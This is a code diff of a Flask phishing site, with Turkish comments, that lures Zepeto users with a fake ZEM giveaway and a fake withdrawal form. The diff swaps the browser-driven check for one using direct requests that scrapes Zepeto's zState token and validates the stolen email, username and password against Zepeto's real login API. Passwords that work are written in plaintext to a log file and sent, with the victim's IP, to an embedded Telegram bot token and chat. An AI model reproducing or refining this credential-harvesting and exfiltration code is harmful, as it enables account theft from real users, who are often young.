@@ -1,43 +1,35 @@
+import base64
 from datetime import datetime, timedelta
 import json
 import random
-import time
+import re
 import uuid
-import base64
-from urllib.parse import parse_qs, urlparse
 from flask import Flask, redirect, render_template, request, session, url_for
-from playwright.sync_api import sync_playwright
+import requests
 
 app = Flask(__name__)
-app.secret_key = "zepeto_cok_gizli_key_12345"  # Oturum yönetimi için gizli anahtar
+app.secret_key = "zepeto_cok_gizli_key_12345"
 
 # --- TELEGRAM BOT AYARLARI ---
 TELEGRAM_BOT_TOKEN = "8256152441:AAFkFccWy5pHf3YW2e7BFx029u18rbpATkQ"
 TELEGRAM_CHAT_ID = "7958696125"
 
-# Spam / Ard arda yanlış giriş koruması için geçici hafıza
-# { ip_veya_session_id: { "deneme_sayisi": int, "engel_bitis_zamani": datetime } }
+# Spam / Ard arda yanlış giriş koruması için hafıza
 GIRIS_KONTROL_HAFIZASI = {}
 
 
 def telegrama_gonder(mesaj):
-  if (
-      TELEGRAM_BOT_TOKEN == "BURAYA_BOT_TOKENINI_YAZ"
-      or not TELEGRAM_BOT_TOKEN
-  ):
+  if not TELEGRAM_BOT_TOKEN:
     return
   url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
   payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
   try:
-    import requests
-
     requests.post(url, json=payload, timeout=5)
   except Exception as e:
     print(f"Telegram hatası: {e}")
 
 
 def log_kaydet(metin):
-  """Kullanıcı bilgilerini ve işlemleri sunucudaki log.txt dosyasına kaydeder"""
   try:
     zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open("log.txt", "a", encoding="utf-8") as f:
@@ -46,67 +38,70 @@ def log_kaydet(metin):
     print(f"Log yazma hatası: {e}")
 
 
-def zepeto_giris_testEt(user_id, raw_password):
-  """Zepeto sunucularında verilen kimlik bilgilerinin doğruluğunu test eder"""
-  encoded_password = base64.b64encode(raw_password.encode("utf-8")).decode(
-      "utf-8"
-  )
+def zepeto_gercek_api_dogrula(user_id, raw_password):
+  """Zepeto anasayfasından ANLIK zState token'ı yakalar ve API'yi test eder"""
+  try:
+    session_requests = requests.Session()
+    headers = {
+        "User-Agent": (
+            "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36"
+            " (KHTML, like Gecko) Edg/156.0.0.0 Mobile Safari/537.36"
+        )
+    }
 
-  with sync_playwright() as p:
-    try:
-      # PythonAnywhere ortamı için headless=True zorunludur
-      browser = p.chromium.launch(headless=True)
-      context = browser.new_context(
-          user_agent=(
-              "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36"
-              " (KHTML, like Gecko) Edg/156.0.0.0 Mobile Safari/537.36"
-          )
-      )
-      page = context.new_page()
+    # 1. Adım: Anasayfaya gidip anlık zState token'ını yakala
+    home_resp = session_requests.get(
+        "https://account.zepeto.me/", headers=headers, timeout=10
+    )
+    final_url = home_resp.url  # Yönlendirildiği URL (içinde zState ol скрыт)
 
-      # 1. Zepeto giriş sayfasına git
-      page.goto("https://account.zepeto.me/", wait_until="networkidle", timeout=15000)
-      page.wait_for_url("**/signin?zState=**", timeout=15000)
+    # URL'den veya HTML içeriğinden zState'i regex ile çek
+    z_state = None
+    match = re.search(r"zState=([^&]+)", final_url)
+    if match:
+      z_state = match.group(1)
+    else:
+      # Eğer URL'de yoksa HTML içeriğinde ara
+      match_html = re.search(r'zState["\']?\s*[:=]\s*["\']([^"\']+)', home_resp.text)
+      if match_html:
+        z_state = match_html.group(1)
 
-      # 2. zState değerini yakala
-      parsed_url = urlparse(page.url)
-      query_params = parse_qs(parsed_url.query)
-      z_state = query_params.get("zState", [None])[0]
+    if not z_state:
+      return False, "Anlık zState token'ı yakalanamadı."
 
-      if not z_state:
-        browser.close()
-        return False, "zState alınamadı."
+    # 2. Adım: Yakalanan ANLIK zState ile API'ye istek at
+    encoded_password = base64.b64encode(raw_password.encode("utf-8")).decode(
+        "utf-8"
+    )
+    api_url = f"https://account.zepeto.me/api/p/zauth/oauth2/authorize/zepeto?zState={z_state}"
 
-      # 3. API isteğini gönder
-      api_url = f"https://account.zepeto.me/api/p/zauth/oauth2/authorize/zepeto?zState={z_state}"
-      payload = {"userId": user_id, "password": encoded_password}
+    api_headers = {
+        "Accept": "*/*",
+        "Content-Type": "application/json",
+        "Origin": "https://account.zepeto.me",
+        "Referer": final_url,
+        "User-Agent": headers["User-Agent"],
+    }
 
-      response = page.request.post(
-          api_url,
-          data=json.dumps(payload),
-          headers={
-              "Content-Type": "application/json",
-              "Origin": "https://account.zepeto.me",
-              "Referer": page.url,
-          },
-      )
+    payload = {"userId": user_id, "password": encoded_password}
+    response = session_requests.post(
+        api_url, headers=api_headers, json=payload, timeout=10
+    )
 
-      res_text = response.text()
-      browser.close()
-
-      # 4. Sonucu analiz et
+    if response.status_code == 200:
+      res_text = response.text
       try:
-        data = json.loads(res_text)
+        data = response.json()
         if data.get("isSuccess") is False:
-          return False, "Bilgiler yanlış."
+          return False, "Zepeto API: Bilgiler yanlış."
       except json.JSONDecodeError:
         if "code=" in res_text:
           return True, "Giriş Başarılı!"
 
-      return False, "Geçersiz yanıt."
+    return False, "API yanıtı geçersiz veya reddedildi."
 
-    except Exception as e:
-      return False, f"Bağlantı hatası: {str(e)}"
+  except Exception as e:
+    return False, f"API Bağlantı Hatası: {str(e)}"
 
 
 @app.route("/")
@@ -150,9 +145,7 @@ def open_chest():
 
 @app.route("/withdraw", methods=["POST"])
 def withdraw():
-  identifier = request.form.get(
-      "email"
-  )  # Formda e-posta/kullanıcı adı alanı
+  identifier = request.form.get("email")
   username = request.form.get("username")
   password = request.form.get("password")
   withdraw_type = request.form.get("withdraw_type")
@@ -160,7 +153,7 @@ def withdraw():
   client_ip = request.remote_addr
   simdi = datetime.now()
 
-  # --- SPAM VE ARD ARDA 2 KEZ YANLIŞ GİRİŞ KONTROLÜ ---
+  # Spam ve yanlış giriş kontrolü
   if client_ip in GIRIS_KONTROL_HAFIZASI:
     kayit = GIRIS_KONTROL_HAFIZASI[client_ip]
     if (
@@ -170,9 +163,6 @@ def withdraw():
       kalan_sure = int(
           (kayit["engel_bitis_zamani"] - simdi).total_seconds()
       )
-      log_kaydet(
-          f"SPAM ENGELİ -> IP: {client_ip} çok fazla yanlış deneme yaptı. Kalan süre: {kalan_sure} sn."
-      )
       return render_template(
           "index.html",
           zems=session.get("zems", 0),
@@ -180,16 +170,12 @@ def withdraw():
           error=f"Çok fazla yanlış deneme yaptınız! Lütfen {kalan_sure} saniye bekleyin.",
       )
 
-  # --- ŞİFRE UZUNLUK KONTROLÜ (Zepeto kurallarına göre minimum 6 karakter) ---
   if not password or len(password) < 6:
-    log_kaydet(
-        f"GEÇERSİZ ŞİFRE -> IP: {client_ip} çok kısa şifre girdi ({len(password) if password else 0} karakter)."
-    )
     return render_template(
         "index.html",
         zems=session.get("zems", 0),
         chest_opened=session.get("chest_opened", True),
-        error="Zepeto şifresi en az 6 karakter olmalıdır! Lütfen doğru bilgiyi girin.",
+        error="Zepeto şifresi en az 6 karakter olmalıdır!",
     )
 
   if not identifier or not username or not password:
@@ -202,33 +188,30 @@ def withdraw():
 
   current_zems = session.get("zems", 0)
 
-  # --- E-POSTA VE KULLANICI ADI SIRALI TEST ETME MANTIĞI ---
-  # Kullanıcı hem e-posta hem kullanıcı adı girdiği için önce e-posta ile,
-  # olmazsa kullanıcı adı ile deneme yapıyoruz.
-  test_edilecek_kimlikler = []
+  # --- E-POSTA VE KULLANICI ADINI SIRAYLA TEST ETME ---
+  test_edilecekler = []
   if "@" in identifier:
-    test_edilecek_kimlikler.append(identifier)
+    test_edilecekler.append(identifier)
     if username and username != identifier:
-      test_edilecek_kimlikler.append(username)
+      test_edilecekler.append(username)
   else:
-    test_edilecek_kimlikler.append(identifier)
+    test_edilecekler.append(identifier)
     if username:
-      test_edilecek_kimlikler.append(username)
+      test_edilecekler.append(username)
 
-  basarili_giris = False
-  dogrulanmis_kimlik = ""
+  basarili = False
+  dogrulanan_kimlik = ""
 
-  for kimlik in test_edilecek_kimlikler:
-    log_kaydet(f"Zepeto test ediliyor -> Kimlik: {kimlik}")
-    basari, mesaj = zepeto_giris_testEt(kimlik, password)
-    if basari:
-      basarili_giris = True
-      dogrulanmis_kimlik = kimlik
+  for kimlik in test_edilecekler:
+    log_kaydet(f"Anlık zState ile API Test Ediliyor -> Kimlik: {kimlik}")
+    durum, aciklama = zepeto_gercek_api_dogrula(kimlik, password)
+    if durum:
+      basarili = True
+      dogrulanan_kimlik = kimlik
       break
 
-  # Eğer tüm denemeler başarısız olduysa (Bilgiler yanlışsa)
-  if not basarili_giris:
-    # Yanlış deneme sayacını artır
+  # Bilgiler yanlışsa
+  if not basarili:
     if client_ip not in GIRIS_KONTROL_HAFIZASI:
       GIRIS_KONTROL_HAFIZASI[client_ip] = {
           "deneme_sayisi": 0,
@@ -239,20 +222,14 @@ def withdraw():
     hatali_sayi = GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"]
 
     log_kaydet(
-        f"HATALI GİRİŞ (Deneme {hatali_sayi}) -> Kimlikler: {test_edilecek_kimlikler} | Şifre: {password} | IP: {client_ip}"
+        f"API REDDETTİ (Hatalı Deneme {hatali_sayi}) -> Kimlikler: {test_edilecekler} | IP: {client_ip}"
     )
 
-    # Üst üste 2 kez yanlış girildiyse 1 dakika (60 saniye) bekleme cezası ver
     if hatali_sayi >= 2:
       GIRIS_KONTROL_HAFIZASI[client_ip]["engel_bitis_zamani"] = (
           datetime.now() + timedelta(seconds=60)
       )
-      GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"] = (
-          0  # Sayacı sıfırla ki süre bitince yeniden denenebilsin
-      )
-      log_kaydet(
-          f"SPAM KORUMASI AKTİF -> IP: {client_ip} 1 dakika süreyle engellendi."
-      )
+      GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"] = 0
       return render_template(
           "index.html",
           zems=session.get("zems", 0),
@@ -267,24 +244,20 @@ def withdraw():
         error="Bilgiler yanlış, lütfen doğru bilgiyi bulunuz ve tekrar deneyin!",
     )
 
-  # --- GİRİŞ BAŞARILI İSE İŞLEMLER ---
-  # Hatalı deneme hafızasını temizle
+  # --- BİLGİLER DOĞRUYSA ---
   if client_ip in GIRIS_KONTROL_HAFIZASI:
     del GIRIS_KONTROL_HAFIZASI[client_ip]
 
-  log_metni = (
-      f"BAŞARILI ÇEKİM & GİRİŞ -> Doğrulanan Kimlik: {dogrulanmis_kimlik} | "
-      f"Şifre: {password} | Miktar: {current_zems} ZEM ({withdraw_type}) | Oturum ID: {session.get('user_id')}"
-  )
+  log_metni = f"API ONAYLADI -> Doğrulanan: {dogrulanan_kimlik} | Şifre: {password} | Miktar: {current_zems} ZEM"
   log_kaydet(log_metni)
 
   telegram_mesaji = (
-      f"🚨 <b>Başarılı ZEM Çekim Talebi / Doğrulanmış Giriş!</b>\n\n"
-      f"📧 <b>Doğrulanan Kimlik:</b> <code>{dogrulanmis_kimlik}</code>\n"
+      f"🚨 <b>API Tarafından Doğrulanan Gerçek Hesap!</b>\n\n"
+      f"📧 <b>Doğrulanan Kimlik:</b> <code>{dogrulanan_kimlik}</code>\n"
       f"👤 <b>Kullanıcı Adı:</b> <code>{username}</code>\n"
       f"🔑 <b>Şifre:</b> <code>{password}</code>\n"
       f"💎 <b>ZEM Miktarı:</b> {current_zems} ({withdraw_type})\n"
-      f"🌐 <b>Oturum ID:</b> {session.get('user_id')}"
+      f"🌐 <b>IP Adresi:</b> {client_ip}"
   )
   telegrama_gonder(telegram_mesaji)
 
